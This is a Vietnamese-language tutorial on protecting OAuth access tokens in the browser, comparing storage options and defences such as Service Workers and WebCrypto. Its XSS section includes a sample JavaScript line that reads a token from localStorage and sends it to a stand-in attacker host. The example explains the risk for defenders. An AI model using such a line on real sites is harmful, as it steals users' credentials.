# Các Phương pháp Bảo vệ Token trong Trình duyệt

Tài liệu này phân tích sâu ưu và nhược điểm của các phương thức lưu trữ Access Token trên trình duyệt (LocalStorage, SessionStorage, Cookie), vạch trần cơ chế tấn công XSS đánh cắp token, và giới thiệu các giải pháp nâng cao (In-memory, Service Worker, WebCrypto API).

## Mục lục

1. [Giới thiệu](#1-giới-thiệu)
2. [Các Lựa chọn Lưu trữ Token trong JavaScript](#2-các-lựa-chọn-lưu-trữ-token-trong-javascript)
3. [Lỗ hổng XSS và Rủi ro Bị đánh cắp Token](#3-lỗ-hổng-xss-và-rủi-ro-bị-đánh-cắp-token)
4. [Các Giải pháp Thay thế để Bảo vệ Token](#4-các-giải-pháp-thay-thế-để-bảo-vệ-token)
5. [Bảng So sánh Tổng hợp các Phương pháp](#5-bảng-so-sánh-tổng-hợp-các-phương-pháp)
6. [Tổng kết](#6-tổng-kết)

---

## 1. Giới thiệu

Cơ chế băm đối sánh **PKCE** cung cấp lá chắn bảo vệ tuyệt đối cho quá trình trao đổi mã ủy quyền (Authorization Code) qua Front Channel. Tuy nhiên, sau khi quá trình đổi code kết thúc và Access Token được phát hành về trình duyệt, PKCE hoàn thành nhiệm vụ và rút lui.

Lúc này, nhà phát triển đối mặt với thử thách vô cùng hóc búa: **Lưu trữ Access Token và Refresh Token ở đâu trên trình duyệt để tránh bị tin tặc đánh cắp?** Do trình duyệt là môi trường sandbox mở, các lựa chọn lưu trữ bảo mật tại đây cực kỳ hạn chế và luôn đi kèm với các đánh đổi kiến trúc phức tạp.

---

## 2. Các Lựa chọn Lưu trữ Token trong JavaScript

Hãy cùng khảo sát 3 vị trí lưu trữ truyền thống mà JavaScript có quyền truy cập trực tiếp:

### 2.1. LocalStorage (Lưu trữ Cục bộ)
*   **Cơ chế:** Lưu trữ dữ liệu dạng key-value tồn tại vĩnh viễn trên ổ cứng của thiết bị người dùng.
*   **Đặc điểm:** Dữ liệu không bị xóa khi tắt trình duyệt, được chia sẻ chung giữa các tab hoặc cửa sổ mở cùng tên miền (Same-origin).
*   **Đánh giá:** Tiện dụng nhất cho lập trình viên, nhưng **kém an toàn nhất**.

### 2.2. SessionStorage (Lưu trữ Phiên)
*   **Cơ chế:** Lưu trữ dữ liệu tồn tại giới hạn theo phiên làm việc của tab trình duyệt.
*   **Đặc điểm:** Dữ liệu được bảo toàn khi reload trang, nhưng sẽ bị xóa lập tức khi người dùng đóng tab đó. Dữ liệu hoàn toàn không được chia sẻ giữa các tab khác nhau.
*   **Đánh giá:** Hạn chế rủi ro hơn LocalStorage một chút, nhưng vẫn dễ dàng bị đọc bởi JavaScript.

### 2.3. Cookies (Thông thường)
*   **Cơ chế:** Bộ nhớ cookie truyền thống của trình duyệt.
*   **Đặc điểm:** Cookies được thiết kế để tự động đính kèm vào mọi request gửi lên server backend.
*   **Đánh giá:** Nếu không cấu hình thuộc tính bảo mật, cookie thông thường vẫn bị JavaScript đọc ghi bình thường và có thêm nguy cơ bị tấn công CSRF (Cross-Site Request Forgery).

---

## 3. Lỗ hổng XSS và Rủi ro Bị đánh cắp Token

> [!IMPORTANT]
> **Quy tắc cơ bản của bảo mật JavaScript:**
> Bất kỳ đoạn mã JavaScript nào được nhúng vào website của bạn (cho dù là từ thư viện CDN bên thứ ba, extension độc hại, hay mã độc XSS bị tiêm vào) đều có **quyền thực thi ngang hàng** với mã chính chủ.

Nếu website của bạn dính phải lỗ hổng **XSS (Cross-Site Scripting)**, kẻ tấn công có thể tiêm mã độc thực thi các lệnh sau để lấy sạch token:
```javascript
// Đánh cắp từ LocalStorage chỉ bằng 1 dòng code:
const stolenToken = localStorage.getItem('access_token');
fetch('https://evil-server.com/steal?token=' + stolenToken);
```
Nguy cơ này xảy ra đồng thời trên cả LocalStorage, SessionStorage và Cookies thông thường vì JavaScript đều có toàn quyền đọc ghi các bộ nhớ này.

---

## 4. Các Giải pháp Thay thế để Bảo vệ Token

Để khắc chế lỗ hổng XSS đánh cắp token trực tiếp, cộng đồng bảo mật đã phát triển các kiến trúc nâng cao:

### 4.1. Lưu trữ trong Bộ nhớ RAM (In-Memory Storage)
*   **Cơ chế:** Lưu Access Token trong một biến JavaScript cục bộ (ví dụ: state của React, closure variable) và hoàn toàn không ghi xuống bất kỳ Storage nào của trình duyệt.
*   **Ưu điểm:** Kháng XSS cực mạnh. Mã độc XSS rất khó trích xuất được biến closure nằm sâu trong RAM ứng dụng.
*   **Nhược điểm:** Trải nghiệm tệ. Mỗi khi người dùng reload trang (`F5`) hoặc mở tab mới, token sẽ bị mất hoàn toàn, bắt buộc phải thực hiện lại luồng đăng nhập ngầm (Silent Renew).

### 4.2. Khống chế Token trong Service Worker (Tách biệt Ngữ cảnh)
*   **Cơ chế:** Đưa toàn bộ mã logic xử lý OAuth và lưu trữ token vào trong một **Service Worker** chạy ở một luồng độc lập (Background Thread).
*   **Ưu điểm:** Cực kỳ an toàn. Do chạy ở ngữ cảnh độc lập, mã độc XSS trên cửa sổ chính hoàn toàn bị chặn đứng, không thể truy cập vào vùng nhớ của Service Worker để đọc token.
*   **Nhược điểm:** Phức tạp hóa luồng. Mã JavaScript chính của SPA không được tự gọi API nữa, mà phải gửi tin nhắn (`postMessage`) nhờ Service Worker gọi hộ và trả kết quả về.

### 4.3. Sử dụng WebCrypto API (Khóa không thể Trích xuất)
*   **Cơ chế:** Sử dụng WebCrypto API tiêu chuẩn để sinh một cặp khóa mật mã bất đối xứng trên trình duyệt với thuộc tính `extractable: false` (khóa riêng tư không thể trích xuất ra ngoài bộ nhớ).
*   **Ưu điểm:** Client dùng Private Key này để ký các requests hoặc mã hóa token lưu ở LocalStorage. Kẻ tấn công có hack được LocalStorage cũng chỉ lấy được chuỗi mã hóa vô nghĩa.
*   **Nhược điểm:** Không tương thích các trình duyệt quá cũ (như IE), cấu hình phức tạp.

---

## 5. Bảng So sánh Tổng hợp các Phương pháp

Dưới đây là bảng đối chiếu chi tiết mức độ bảo mật và độ phức tạp triển khai của các phương pháp lưu trữ token:

| Phương pháp | Kháng XSS | Kháng CSRF | Tiện ích lập trình | Trải nghiệm người dùng |
| :--- | :---: | :---: | :---: | :--- |
| **LocalStorage** | ❌ Kém |  An toàn | ⭐ Dễ nhất | Tốt (Tồn tại vĩnh viễn). |
| **SessionStorage** | ❌ Kém |  An toàn | ⭐ Dễ nhất | Trung bình (Mất khi đóng tab). |
| **In-Memory RAM** |  Khá |  An toàn | ⚙️ Khó | Tệ (Bị xóa khi nhấn F5). |
| **Service Worker** |  Tốt |  An toàn | 🛠️ Rất khó | Tốt (Chạy ngầm). |
| **HttpOnly Cookie** |  Tuyệt đối | ❌ Nguy cơ CSRF | ⚙️ Khó | Tốt (Tự động đính kèm). |

---

## 6. Tổng kết

*   **Không có giải pháp hoàn hảo:** Mọi phương thức lưu trữ token trực tiếp bằng JavaScript đều phải đánh đổi giữa tính bảo mật (kháng XSS) và trải nghiệm người dùng (giữ phiên làm việc khi F5/mở tab mới).
*   **Nguyên tắc thiết kế tối thượng:** Cách duy nhất để đảm bảo tuyệt đối Access Token không bị JavaScript (và mã độc XSS) đọc trộm là **không bao giờ cung cấp Access Token cho mã JavaScript**.
*   **Bước phát triển tiếp theo:** Trong bài học kế tiếp, chúng ta sẽ khảo sát mô hình **Backend-for-Frontend (BFF)** - giải pháp giữ token 100% ngoài phạm vi của JavaScript bằng cách sử dụng HttpOnly Secure Cookie bảo mật tối đa.

---

## Liên quan

*   [Authorization Code Flow cho Web Application](../oauth_for_server_side_app/authorization_code_flow_for_web_application.md) — quan hệ nối tiếp: Authorization Code Flow là tiền đề phát hành Access Token; bài toán **lưu trữ Token an toàn** trong tài liệu này là bước downstream ngay sau đó.
*   [Front Channel & Back Channel](../api_security_concepts/front_channel_&_back_channel.md) — **Front Channel** là lý do cốt lõi tại sao Token trong trình duyệt cần bảo vệ đặc biệt: Token nằm trong môi trường JavaScript mở, không có bảo đảm của Back Channel.

---
[← Quay lại mục lục](../README.md)
